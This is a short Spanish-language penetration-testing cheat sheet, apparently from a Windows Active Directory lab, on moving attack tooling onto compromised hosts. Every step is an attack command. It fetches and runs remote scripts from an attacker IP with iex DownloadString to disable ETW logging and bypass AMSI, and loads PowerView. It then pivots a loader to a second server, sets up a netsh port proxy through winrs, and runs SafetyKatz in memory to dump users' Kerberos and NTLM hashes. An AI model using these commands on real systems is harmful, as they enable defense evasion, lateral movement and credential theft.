# Transferir 

Tags: #FileTransfer #AMSI 

## Transferir y Bypass AMSI directamente 

```powershell 
Paso 1:
- Ejecutar 'hfs (HTTP File Server)' para compartir archivos en Windows en la máquina de atacante Windows 

Paso 2:
❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/sbloggingbypass.txt')  
# Deshabilita el logging ETW de PowerShell en memoria para reducir la telemetría/eventos que Defender o un EDR pueden registrar durante la ejecución de comandos y tooling ofensivo. 

Paso 3: 
❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/Amsi-Byp.txt')  
# Ejecuta un payload PowerShell extremadamente ofuscado y codificado en Base64 para evadir detección, deshabilitar telemetría/logging ETW y ejecutar comandos dinámicamente en memoria sin tocar disco. Bypass AMSI

Paso 4:
❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/PowerView.ps1')
# Descargar PowerView

Invoke-WebRequest -Uri "http://<IP-de-tu-HFS>:8080/Loader.exe" -OutFile "C:\Users\Public\Loader.exe"
```

## Transferir hacia un segundo server utilizando el primer server como pivote 

```powershell 
Paso 1:
- Ejecutar 'hfs (HTTP File Server)' para compartir archivos en Windows en la máquina de atacante Windows 

Paso 2:
❯ iwr http://IP_Atacante/Loader.exe -OutFile C:\Users\Public\Loader.exe
# En el server 1 copiar el arhivo Loader (Server directo a la máquina de atacante)

Paso 3:
❯ echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
# Transferir el Loader desde el server 1 al server 2 (dcorp-mgmt)
```

```powershell 
# Ejecutar los comandos desde el server 1 
Paso 4:
❯ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_Atacante"
# Crear un PortForwarding usando winrs para evitar detecciones en el server 2 (dcorp-mgmt) 

Paso 5: 
❯  $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
# Usar Loader para ejecutar SafetyKatz en memoria y obtener el hash 'aes256_hmac y rc4_hmac_nt' de los usuarios 
```